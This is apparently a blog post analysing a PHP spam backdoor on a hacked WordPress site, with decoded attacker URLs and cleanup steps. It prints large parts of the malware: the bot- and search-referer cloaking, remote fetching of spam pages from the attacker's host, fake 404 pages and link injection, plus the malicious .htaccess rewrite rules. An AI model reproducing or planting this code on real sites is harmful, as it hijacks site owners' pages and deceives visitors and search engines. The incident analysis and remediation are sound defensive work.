} else {
    $curx = $cdir.$md5urx;
    if (@file_exists($curx)) {@
        list($IDpack, $mk, $doorcontent, $pdf, $contenttype) = @explode("|||", @file_get_contents($curx));
        $doorcontent = @base64_decode($doorcontent);
        $bot = 0;
        $se = 0;
        $mobile = 0;
        if (preg_match("#google|gsa-crawler|AdsBot-Google|Mediapartners|Googlebot-Mobile|spider|bot|yahoo|google web preview|mail\.ru|crawler|baiduspider#i", @$_SERVER["HTTP_USER_AGENT"])) $bot = 1;
        if (preg_match("#android|symbian|iphone|ipad|series60|mobile|phone|wap|midp|mobi|mini#i", @$_SERVER["HTTP_USER_AGENT"])) $mobile = 1;
        if (preg_match("#google|bing\.com|msn\.com|ask\.com|aol\.com|altavista|search|yahoo|conduit\.com|charter\.net|wow\.com|mywebsearch\.com|handycafe\.com|babylon\.com#i", @$_SERVER["HTTP_REFERER"])) $se = 1;
        if ($bot) {
            $pdf += 0;
            if ($pdf == 1) {
                header("Content-Type: application/pdf");
            }
            if ($pdf == 2) {
                header("Content-Type: image/png");
            }
            if ($pdf == 3) {
                header("Content-Type: text/xml");
            }
            if ($pdf == 4) {
                $contenttype = @base64_decode($contenttype);
                $types = explode("\n", $contenttype);
                foreach($types as $val) {
                    $val = trim($val);
                    if ($val != "") header($val);
                }
            }
            echo $doorcontent;
            exit;
        }
        if ($se) {
            echo get_page_by_curl("http://$domain/lp.php?ip=".$IDpack.
                "&mk=".rawurlencode($mk).
                "&d=".$md5host.
                "&u=".$md5urx.
                "&addr=".$_SERVER["REMOTE_ADDR"], @$_SERVER["HTTP_USER_AGENT"]);
            exit;
        }
        header($_SERVER['SERVER_PROTOCOL']." 404 Not Found");
        echo '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">'."\n";
        echo '<html><head>'."\n";
        echo '<title>404 Not Found</title>'."\n";
        echo '</head><body>'."\n";
        echo '<h1>Not Found</h1>'."\n";
        echo '<p>The requested URL '.$_SERVER['REQUEST_URI'].' was not found on this server.</p>'."\n";
        echo '<hr>'."\n";
        echo '<address>'.$_SERVER['SERVER_SOFTWARE'].' PHP/'.phpversion().' Server at '.$_SERVER['HTTP_HOST'].' Port 80</address>'."\n";
        echo '</body></html>';
        exit;
    } else {
        $crurl = "http://".@$_SERVER['HTTP_HOST'].@$_SERVER['REQUEST_URI'];
        $buf = get_page_by_curl($crurl);
        $curx = $cdir."fff.sess";
        if (@file_exists($curx)) {
            $links = @file($curx, FILE_SKIP_EMPTY_LINES | FILE_IGNORE_NEW_LINES);
            $c = @count($links) - 1;
            shuffle($links);
            if ($c > 20) $c = 20;
            $regexp = "<a\s[^>]*href=(\"??)([^\" >]*?)\\1[^>]*>(.*)<\/a>";
            if (preg_match_all("/$regexp/siU", $buf, $matches)) {
                $zval = $matches[0];
                shuffle($zval);
                foreach($zval as $val) {
                    if ($c < 0) break;
                    list($l, $anchor) = explode("|||", trim($links[$c]));
                    $new = '<a href="'.$l.'">'.$anchor.'</a>';
                    $buf = str_ireplace($val, $new, $buf);
                    $c--;
                }
            }

        }
        echo $buf;
    }
}
```

Good thing I opened this up! This script has some meat to it. First, lets go through and do some fact discovering. I'll start with some simple base 64 decodings and other facts that jump out at me.

```{.php .numberLines startFrom="1"}
$domain = base64_decode("Zi5tZW55dWRueWEuY29t");
// ouptut: f.menyudnya.com
```
Security through obfuscation? I wonder what the actual effectiveness of base64_encoding this is. I guess it's enough to detour most people.

I'll continue to decode the url that content is downloaded and installed to the our server from.
```{.php .numberLines startFrom="1"}
'http://update.' . base64_decode("Zi5tZW55dWRueWEuY29t") . '/arc/' . $md5host;
// ouptut: http://update.f.menyudnya.com/arc/<md5_of_host>.tgz
```
Despite verifying the url was generated correctly, every attempt to access it yielded a 404. :(

```{.php .numberLines startFrom="1"}
$md5pass = "e5e4570182820af0a183ce1520afe43b";
```
Just making a mental note of this. Testing against various rainbow tables didn't yield anything. Another thing that caught my eye is that this script accepts a `POST` request containing what seems to be a base 64 encoded password `@$_POST["p"]` as well as mode `@$_POST["pppp_check"]`. Perfect, lets set some traps to capture the attacker's input. It will very likely be useless, but it could still be fun to catch the attacker's password. :)

```{.php .numberLines startFrom="1"}
$info = array();
$info['request'] = $_REQUEST;
$info['server'] = $_SERVER;
$hasPwd = false;
if ($_POST["p"] != "") {
    $info['pwd'] = base64_decode(@$_POST["p"]);
    $hasPwd = true;
}
file_put_contents('logs/request_log' . time() . ($hasPwd ? '_with_pwd' : '') . '.txt', print_r($info, 1));
```

To validate the above worked, using Postman, I made some post calls to `http://www.myblog.com?p=123` with `POST` parameters: `p=test_pwd`, and `pppp_check=3`, of course the password is invalid, but this demonstrates the capturing of the password/script server/info. I added this script to the top of `lusts-disadvantage.php`.

At this point I've also broken the attack file into three parts:

1. This part is an admin section which deals with updating the spam urls to redirect to. Further investigation shows how the attack script guarantees that a url uniquely maps to a spam site. I'm assuming this is so that it raises less suspicion to bots and search engines.
2. The actual content-delivery logic. I call it content-delivery because depending on where the visitor comes from, they will get different content. Search engines, Mobile, and Bots all get different treatment. Using lookups within the `$curx` directory. `$curx` is simply `.` + `md5` of the host, and it lives in the root directory of the Wordpress installation.
3. Deal with a missing `$curx` directory. A quick scan seems to reveal that the script first fetches the originally intended page, loads a list of links from the file `.fff.sess`, shuffles the links, replace links in the loaded webpage with spam links, then serves the content. This seems to be the scripts last-ditch effort to spam viewers in the event you delete the `$curx` directory. Unfortunately, my friend's blog did not have the `.fff.sess` file so I could not open it up to examine.


## Step 5. Clean up and Fix

At this point we still don't know how the attacker got in but the scripts seem pretty contained, and no other odd scripts showed up on the server. I also did a scan over the Database looking for odd entries and did not find any. In addition you should can all assets to ensure that they

0. The safest step is to probably restore your site from a backup and completely fresh install the Wordpress installation. The reason being is that there are 1000s of ways a hacker could exploit your website. Some include:
    - Opening up other less obvious backdoors. Folder permissions, creation of new DB users, addition of admin scripts, etc.
    - Injecting attack scripts inside file assets. Images, Javascript, Less obvious php files, etc.
    - Some scripts can even re-install themselves when they detect that they have been deleted.

    There are many other cases and a wide range of tools to help detect hacked content. A recent tool recommended by my friend Mike is [NeoPI](https://github.com/Neohapsis/NeoPI) which can help detect obfuscated and encrypted content within files. As are the types of attacks diverse, so are the tools used to combat hackers.

    Only continue if you understand the above comments and are ok with the risk of only partially removing your hacked code. For our hack it seems isolated so we'll just remove the files and better secure our system.

1. Before taking steps to delete anything, the first thing I recommend is Googling similar hacks using keywords obtained from this attack. `lusts-disadvantages.php`, the content url, etc.
    - Nothing shows up when searching `lusts-disadvantages.php`.
    - A search for "Zi5tZW55dWRueWEuY29t" yields 4 results. Soon to be 5 :) The links lead to a few Stack Overflow questions: [here](http://stackoverflow.com/questions/35440654/i-found-this-wierd-php-file-on-my-server-it-seems-that-it-sabotaged-our-seo-in) and [here](http://stackoverflow.com/questions/29980379/astronautic-benchmark-php-virus-script). These posts reached a similar conclusion as I did, however, they don't provide a solution. I found this next [link](http://ddecode.com/phpdecoder/?results=4f7cc0b054934884a997f79c61fde981) particularly interesting. It shows a bunch of previous queries of people running php base 64 decode expressions. Very likely trying to do the same thing as me.
    - Every example seemed to route to a different file than `lusts-disadvantages.php`. This is most likely intentional to further reduce the chance of detection.
    - I also noticed different content download urls. This partially explains why my link 404'd.

2. Update Wordpress and all plugins. This is also a good time to Google search each of your plugins to see if there are any known vulnerabilities. I also recommend only using plugins that are popular and thus well vetted. Usually attackers take advantage of known Wordpress and popular plugin vulnerabilities and can be very easily thwarted. The reason for attacking the core and popular plugins is directly linked to their large distribution. In terms of dollars, it's simple, if a hacker can exploit more pages, they can make more money through ads.

3. Take the website offline for now. We are going to go through and remove files.

    - First, remove the conditional redirects from the `.htaccess` file. Specifically, remove the following lines.
    ```{.bash .numberLines startFrom="1"}
    RewriteCond %{HTTP_USER_AGENT} (google|yahoo|msn|aol|bing) [OR]
    RewriteCond %{HTTP_REFERER} (google|yahoo|msn|aol|bing)
    RewriteRule ^(.*)$ lusts-disadvantage.php?$1 [L]
    ```
    - Next remove the `.md5(host)/` directory from the root of the Wordpress installation. A sample folder will look like `.00547420a52b40069b82beb76cdce8f7/`.
    - Delete `lusts-disadvantages.php`, or whatever the decoded file name on your server turns out to be. It should be the "odd-duck" and will stand out.

4. Reset your FTP/SSH user account credentials. It is also recommended to create non-obvious usernames. i.e. don't use `root` or your first name.

5. Bring Wordpress online and change all user credentials. Use a strong password containing uppercase, lowercase, numbers, and special characters. If you're not certain, Google good password standards.

6. Google how to [Lock Down Wordpress](https://www.google.com/webhp?sourceid=chrome-instant&ion=1&espv=2&ie=UTF-8#q=lock%20down%20wordpress). This includes disabling the admin user, obfuscating admin pages, etc. Do whatever feels sufficient.

7. Be sure to take frequent backups in case your website gets hacked and you can't recover it!
